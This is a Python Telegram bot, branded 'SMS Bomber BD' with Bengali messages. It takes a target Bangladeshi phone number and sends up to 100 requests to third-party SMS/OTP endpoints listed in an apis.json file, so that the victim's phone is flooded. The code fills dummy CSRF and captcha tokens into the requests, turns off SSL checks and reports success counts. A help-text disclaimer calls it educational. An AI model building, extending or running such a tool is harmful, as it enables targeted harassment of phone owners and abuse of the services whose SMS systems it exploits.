import os
import json
import asyncio
import aiohttp
import logging
from typing import Dict, List, Tuple
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, CallbackQueryHandler, ContextTypes, filters

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# States for conversation
PHONE, AMOUNT = range(2)

# Global stats
class BomberStats:
    def __init__(self):
        self.success = 0
        self.failed = 0
        self.total = 0
        
    def reset(self):
        self.success = 0
        self.failed = 0
        self.total = 0

stats = BomberStats()

# Load APIs from JSON file
def load_apis() -> List[Dict]:
    try:
        with open('apis.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data.get('apis', [])
    except Exception as e:
        logger.error(f"Error loading APIs: {e}")
        return []

# Replace placeholders in URL and body
def prepare_request(api: Dict, phone: str) -> Tuple[str, str, Dict, str]:
    url = api['url'].replace('{{phone}}', phone).replace('*****', phone).replace('88{{phone}}', f'88{phone}')
    
    body = api.get('body', '')
    if body:
        body = body.replace('{{phone}}', phone).replace('*****', phone).replace('88{{phone}}', f'88{phone}')
        # Replace other common placeholders with dummy values
        body = body.replace('{{email}}', f'{phone}@temp.com')
        body = body.replace('{{randomName}}', 'User')
        body = body.replace('{{randomEmail}}', f'{phone}@mail.com')
        body = body.replace('{{firstName}}', 'John')
        body = body.replace('{{lastName}}', 'Doe')
        body = body.replace('{{csrf_token}}', 'dummy_csrf_token')
        body = body.replace('{{captchaToken}}', 'dummy_captcha')
        body = body.replace('{{apiKey}}', 'dummy_api_key')
        body = body.replace('{{token}}', 'dummy_token')
        body = body.replace('{{bearer}}', 'dummy_bearer')
        body = body.replace('{{timestamp}}', '1234567890')
        body = body.replace('{{deviceId}}', 'dummy_device_id')
        body = body.replace('{{xsrfToken}}', 'dummy_xsrf')
        body = body.replace('{{auth}}', 'dummy_auth')
        body = body.replace('{{nextAction}}', 'dummy_action')
        body = body.replace('{{routerState}}', 'dummy_state')
        body = body.replace('{{boundary}}', '----WebKitFormBoundary')
        body = body.replace('{{csrf}}', 'dummy_csrf')
        body = body.replace('{{apiToken}}', 'dummy_api_token')
        body = body.replace('{{authToken}}', 'dummy_auth_token')
    
    headers = api.get('headers', {})
    method = api.get('method', 'get').upper()
    
    return url, method, headers, body

# Send SMS using a single API
async def send_sms(session: aiohttp.ClientSession, api: Dict, phone: str) -> bool:
    try:
        url, method, headers, body = prepare_request(api, phone)
        
        timeout = aiohttp.ClientTimeout(total=10)
        
        if method == 'GET':
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as response:
                return response.status in [200, 201, 202, 204]
        else:
            # Determine content type
            content_type = headers.get('Content-Type', '').lower()
            
            if 'application/json' in content_type:
                try:
                    json_body = json.loads(body) if body else {}
                    async with session.post(url, json=json_body, headers=headers, timeout=timeout, ssl=False) as response:
                        return response.status in [200, 201, 202, 204]
                except json.JSONDecodeError:
                    async with session.post(url, data=body, headers=headers, timeout=timeout, ssl=False) as response:
                        return response.status in [200, 201, 202, 204]
            else:
                async with session.post(url, data=body, headers=headers, timeout=timeout, ssl=False) as response:
                    return response.status in [200, 201, 202, 204]
                    
    except Exception as e:
        logger.debug(f"API {api.get('name', 'Unknown')} failed: {e}")
        return False

# Bombing worker
async def bombing_task(phone: str, amount: int, apis: List[Dict], update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats.reset()
    stats.total = amount
    
    success_apis = []
    failed_apis = []
    
    # Create connector with SSL verification disabled for problematic APIs
    connector = aiohttp.TCPConnector(ssl=False, limit=100)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for i in range(amount):
            if i >= len(apis):
                # Cycle through APIs if amount > available APIs
                api = apis[i % len(apis)]
            else:
                api = apis[i]
            
            success = await send_sms(session, api, phone)
            
            if success:
                stats.success += 1
                success_apis.append(api.get('name', f'API-{i+1}'))
            else:
                stats.failed += 1
                failed_apis.append(api.get('name', f'API-{i+1}'))
            
            # Update progress every 5 requests
            if (i + 1) % 5 == 0 or (i + 1) == amount:
                try:
                    progress_text = f"""
📊 **বোম্বিং প্রগ্রেস**
━━━━━━━━━━━━━━━━━━━
📱 নাম্বার: `{phone}`
✅ সফল: {stats.success}
❌ ব্যর্থ: {stats.failed}
📊 মোট: {i+1}/{amount}
━━━━━━━━━━━━━━━━━━━
                    """
                    await update.message.reply_text(progress_text, parse_mode='Markdown')
                except:
                    pass
            
            # Small delay to prevent rate limiting
            await asyncio.sleep(0.5)
    
    # Final report
    report = f"""
🎯 **বোম্বিং সম্পূর্ণ হয়েছে!**
━━━━━━━━━━━━━━━━━━━
📱 টার্গেট: `{phone}`
✅ সফল: {stats.success}
❌ ব্যর্থ: {stats.failed}
📊 সর্বমোট: {amount}
━━━━━━━━━━━━━━━━━━━

💡 আবার বোম্বিং করতে /start দিন
    """
    
    await update.message.reply_text(report, parse_mode='Markdown')

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "💣 **Welcome to SMS Bomber BD** 💣\n\n"
        "📱 আপনার টার্গেট নাম্বারটি দিন (11 ডিজিট):\n\n"
        "উদাহরণ: 01712345678",
        parse_mode='Markdown'
    )
    return PHONE

# Get phone number
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    phone = update.message.text.strip()
    
    # Validate Bangladeshi phone number
    if not (phone.startswith('01') and len(phone) == 11 and phone.isdigit()):
        await update.message.reply_text(
            "❌ ভুল নাম্বার! বাংলাদেশি মোবাইল নাম্বার দিন (11 ডিজিট)\n\n"
            "আবার চেষ্টা করুন:"
        )
        return PHONE
    
    context.user_data['phone'] = phone
    
    await update.message.reply_text(
        f"✅ নাম্বার গ্রহণ করা হয়েছে: `{phone}`\n\n"
        f"🔢 কতটি SMS পাঠাতে চান? (1-100)\n\n"
        f"উদাহরণ: 50",
        parse_mode='Markdown'
    )
    return AMOUNT

# Get amount and start bombing
async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    amount_text = update.message.text.strip()
    
    try:
        amount = int(amount_text)
        if amount < 1 or amount > 100:
            raise ValueError("Amount out of range")
    except:
        await update.message.reply_text(
            "❌ ভুল সংখ্যা! 1 থেকে 100 এর মধ্যে একটি সংখ্যা দিন:\n\n"
            "আবার চেষ্টা করুন:"
        )
        return AMOUNT
    
    phone = context.user_data.get('phone')
    
    await update.message.reply_text(
        f"🚀 **বোম্বিং শুরু হচ্ছে...**\n\n"
        f"📱 টার্গেট: `{phone}`\n"
        f"🔢 পরিমাণ: {amount}\n\n"
        f"⏳ অনুগ্রহ করে অপেক্ষা করুন...",
        parse_mode='Markdown'
    )
    
    # Load APIs and start bombing
    apis = load_apis()
    
    if not apis:
        await update.message.reply_text(
            "❌ কোন API পাওয়া যায়নি! apis.json ফাইলটি চেক করুন।"
        )
        return ConversationHandler.END
    
    # Start bombing in background
    asyncio.create_task(bombing_task(phone, amount, apis, update, context))
    
    return ConversationHandler.END

# Cancel conversation
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "❌ বাতিল করা হয়েছে।\n\n"
        "আবার শুরু করতে /start দিন"
    )
    return ConversationHandler.END

# Status command
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    apis = load_apis()
    await update.message.reply_text(
        f"📊 **বর্তমান অবস্থা**\n\n"
        f"✅ উপলব্ধ API: {len(apis)}টি\n"
        f"🤖 বট স্ট্যাটাস: চালু আছে\n\n"
        f"বোম্বিং শুরু করতে /start দিন",
        parse_mode='Markdown'
    )

# Help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 **সাহায্য**\n\n"
        "/start - নতুন বোম্বিং শুরু করুন\n"
        "/status - API স্ট্যাটাস দেখুন\n"
        "/help - এই মেনু দেখুন\n\n"
        "⚠️ **সতর্কীকরণ:**\n"
        "এই বট শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে ব্যবহার করুন।\n"
        "অন্যের ক্ষতি করতে ব্যবহার করা আইনত দণ্ডনীয়।"
    )

# Error handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "⚠️ একটি ত্রুটি হয়েছে! আবার চেষ্টা করুন।"
            )
    except:
        pass

def main():
    # Get token from environment variable
    token = os.environ.get('BOT_TOKEN')
    
    if not token:
        print("❌ BOT_TOKEN environment variable not set!")
        print("Please set your Telegram bot token:")
        print("export BOT_TOKEN=your_bot_token_here")
        return
    
    # Create application
    application = Application.builder().token(token).build()
    
    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    # Add handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('status', status))
    application.add_handler(CommandHandler('help', help_command))
    application.add_error_handler(error_handler)
    
    # Start the bot
    print("🤖 Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
